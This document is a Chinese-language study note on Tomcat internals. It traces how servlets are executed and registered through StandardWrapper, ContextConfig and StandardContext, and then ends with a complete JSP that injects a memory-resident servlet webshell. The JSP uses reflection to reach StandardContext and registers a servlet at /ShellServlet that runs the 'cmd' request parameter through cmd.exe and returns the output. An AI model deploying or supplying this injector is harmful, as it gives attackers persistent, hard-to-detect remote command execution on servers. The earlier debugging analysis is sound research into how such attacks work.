  ## Servlet流程分析

![](attachments/Pasted%20image%2020230315151437.png)

### Servlet执行流程
还是获取context环境

![](attachments/Pasted%20image%2020230315154144.png)

`StandardWrapper#initServlet`,在这里是可以看出来调用是直接传入的值

![](attachments/Pasted%20image%2020230315155914.png)

```java
private synchronized void initServlet(Servlet servlet) throws ServletException {  
  
    if (instanceInitialized && !singleThreadModel) {  
        return;  
    }  
  
    // Call the initialization method of this servlet  
    try {  
        if (Globals.IS_SECURITY_ENABLED) {  
            boolean success = false;  
            try {  
                Object[] args = new Object[] { facade };  
                SecurityUtil.doAsPrivilege("init", servlet, classType, args);  
                success = true;  
            } finally {  
                if (!success) {  
                    // destroy() will not be called, thus clear the reference now  
                    SecurityUtil.remove(servlet);  
                }  
            }  
        } else {  
            servlet.init(facade);  
        }  
  
        instanceInitialized = true;  
    } catch (UnavailableException f) {  
        unavailable(f);  
        throw f;  
    } catch (ServletException f) {  
        // If the servlet wanted to be unavailable it would have  
        // said so, so do not call unavailable(null).        throw f;  
    } catch (Throwable f) {  
        ExceptionUtils.handleThrowable(f);  
        getServletContext().log(sm.getString("standardWrapper.initException", getName()), f);  
        // If the servlet wanted to be unavailable it would have  
        // said so, so do not call unavailable(null).        throw new ServletException(sm.getString("standardWrapper.initException", getName()), f);  
    }  
}
```

在同一个类里面`loadServlet`调用了`initServlet`,还有Servlet值的传输

![](attachments/Pasted%20image%2020230315160415.png)

同样`allocate`方法，做了`loadServlet`的调用

![](attachments/Pasted%20image%2020230315164708.png)

`StandardWrapperValve#invoke`调用allocate

![](attachments/Pasted%20image%2020230315164833.png)

wrapper向上找赋值 

![](attachments/Pasted%20image%2020230315165022.png)

再去找这个invoke的调用的话，就是StandardContextValve

![](attachments/Pasted%20image%2020230315165732.png)

这里就已经可以看到请求的信息了

![](attachments/Pasted%20image%2020230315165749.png)

在这里可以发现，wrapper拿到了我们的Servlert的类

![](attachments/Pasted%20image%2020230316151505.png)

这里是一长串的invoke的传递、源头是在`CoyoteAdapter#service`

![](attachments/Pasted%20image%2020230316185312.png)


这一长串的invoke实质上是对http请求的处理

###  Servlet的注册
在之前的[Java Web基础](../../Java%20Web/Java%20Web基础.md)中有说到过，Servlet是在首次对其进行访问时，检测是否存在该Servlet没有的话就会执行init开始初始化，现在我使用的是注解的方式来完成Servlet的注册的
在上面的执行流程中，最后一个invoke，在调用allocate前，servlet的值还是null，那么我们就到invoke后面去仔细看看

从loadServlet中传给initServlet的servlet向上找

![](attachments/Pasted%20image%2020230316194134.png)

找给他赋值的servletClass，找到了setServletClass这个方法，看意思有判断是不是JSP的Servlet

![](attachments/Pasted%20image%2020230316194504.png)


在这里找用法

![](attachments/Pasted%20image%2020230317093919.png)

这个configureContext在之前的调试中遇到过，就是在web.xml中读配置的，而且从包名来说下面的也更像是初始化时使用的，这里先看ContextConfig

![](attachments/Pasted%20image%2020230317094714.png)

进getServletClass()，`ServletDef#getServletClass`

![](attachments/Pasted%20image%2020230317094835.png)

查找了一下这个servletClass的用法

![](attachments/Pasted%20image%2020230317095132.png)

上面的是JSP的，那么只能是下面的`processAnnotationWebServlet`,这个函数中有对web.xml的判断，基本上就是对注释的方式来注册Servlet的实现，继续往下翻filter之类的也都有这样通过注释的方法的注册

![](attachments/Pasted%20image%2020230317095442.png)

而按照原来的xml的话在1282行这里是有注册的

![](attachments/Pasted%20image%2020230317100610.png)

在这个位置小小的下了一个断点

![](attachments/Pasted%20image%2020230317100906.png)

不需要访问直接调试就会有断在这里，在这里setServerletDef，同时将==isWebXMLservletDef==设置为false这样的话应该web.xml就不会起效

![](attachments/Pasted%20image%2020230317101102.png)

在下面各种添加东西，最后在下面判断然后addServlet

![](attachments/Pasted%20image%2020230317101651.png)

![](attachments/Pasted%20image%2020230317101832.png)

![](attachments/Pasted%20image%2020230317102019.png)

到下面又是设置standardcontext之类

![](attachments/Pasted%20image%2020230317102530.png)

![](attachments/Pasted%20image%2020230317104450.png)

webConfig这里向下运行就，进入configureContext

![](attachments/Pasted%20image%2020230317105245.png)

然后就是对filter的读取，添加，再向下就是对Servlet的get，虽然这里为null，但是还是创建了Wrapper

![](attachments/Pasted%20image%2020230317105602.png)

后面还有对Wapper的处理，但是这个时候servlet还是只有默认的

![](attachments/Pasted%20image%2020230317105841.png)

下面的addChild将Wapper装载到了context中

![](attachments/Pasted%20image%2020230317110014.png)

判断是不是jsp

![](attachments/Pasted%20image%2020230317120504.png)

向下进入

![](attachments/Pasted%20image%2020230317120557.png)

ServletDef里面遍历出来

![](attachments/Pasted%20image%2020230317121536.png)

在1307行这里获取到了我们的Servlet

![](attachments/Pasted%20image%2020230317110243.png)

![](attachments/Pasted%20image%2020230317110303.png)

这里涉及到一个懒加载机制，基本上就是如果有这个值得存在得话，就不需要访问可以在容器加载得时候就加载这个servlet

![](attachments/Pasted%20image%2020230319142210.png)


### web.xml再调试
到这里得话其实整个过程都看得差不多了，但是很乱，因为原本得目的带着一些想看看注释类型得webservlet是怎么注册的，所以直接拿web.xml从请求那里，跟了一次，关键步骤就那么几个
直接跟到ContextConfig,获取Context

![](attachments/Pasted%20image%2020230319152220.png)

![](attachments/Pasted%20image%2020230319154307.png)

进到configureContext中，到wrapper的创建和把Servlet塞进去，前面几个是内置的默认servlet

![](attachments/Pasted%20image%2020230319155110.png)

这里是塞Servlet的关键函数
- setName
- setServletClass

![](attachments/Pasted%20image%2020230319155453.png)

addChild和设置映射

![](attachments/Pasted%20image%2020230319155954.png)

到这里就已经完成了一个servlet的注册，我们也只需要这些步骤，就可以实现servlet的注册
## 内存马的编写

### 基本流程
- 编写一个恶意的servlet
- 获取stansardcontext
- 穿甲一个stansardwrapper
- 将恶意的SSServlet放到StandardWrapper中
- addChild将StandardWrapper放到StandardContext中
- 为Servlet添加路径映射

### shellServlet.jsp

```jsp
<%@ page import="java.io.IOException" %><%--  
  Created by IntelliJ IDEA.  User: wum0nster  Date: 2023/3/19  Time: 15:25  To change this template use File | Settings | File Templates.--%>  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="java.util.Scanner" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="org.apache.catalina.Wrapper" %>  
<%!  
public class ShellServlet extends HttpServlet{  
    @Override  
    public void init() throws ServletException {  
        super.init();  
    }  
  
    @Override  
    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {  
        if (httpServletRequest.getParameter("cmd") != null){  
            InputStream in = null;  
            try {  
                in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",httpServletRequest.getParameter("cmd")}).getInputStream();  
                Scanner s = new Scanner(in).useDelimiter("\\A");  
                String out = s.hasNext()?s.next():"";  
                Field requestF = httpServletRequest.getClass().getDeclaredField("request");  
                requestF.setAccessible(true);  
                Request request = (Request)requestF.get(httpServletRequest);  
                request.getResponse().getWriter().write(out);  
            }  
            catch (IOException e) {}  
            catch (NoSuchFieldException e) {}  
            catch (IllegalAccessException e) {}  
        }    }  
    @Override  
    public void destroy() {  
        super.destroy();  
    }  
}  
%>  
  
<%  
    ServletContext servletContext = request.getServletContext();  
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
    applicationContextField.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
  
    Field standardcontextField = applicationContext.getClass().getDeclaredField("context");  
    standardcontextField.setAccessible(true);  
    StandardContext standardContext = (StandardContext) standardcontextField.get(applicationContext);  
  
    Wrapper wrapper = standardContext.createWrapper();  
    wrapper.setName("ShellServlet");  
    wrapper.setServletClass(ShellServlet.class.getName());  
    wrapper.setServlet(new ShellServlet());  
  
    standardContext.addChild(wrapper);  
    standardContext.addServletMappingDecoded("/ShellServlet", "ShellServlet");  
  
%>  
<html>  
<head>  
    <title>Title</title>  
</head>  
<body>  
  
</body>  
</html>
```


## 总结

事实上在前半截的调试和分析是很混乱的，不过也加深了认识，有得有失，两种调试方法
- 从结尾看参数找需要设置的值
- 从头开始看注册的过程

事实上想要真正的理解内存马，需要去深刻的理解在tomcat中Host，Context，Wrapper的关系

## 参考链接

[Java内存马系列-05-Tomcat 之 Servlet 型内存马 | 芜风 (drun1baby.top)](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-6)

https://www.bilibili.com/video/BV1E84y1w77R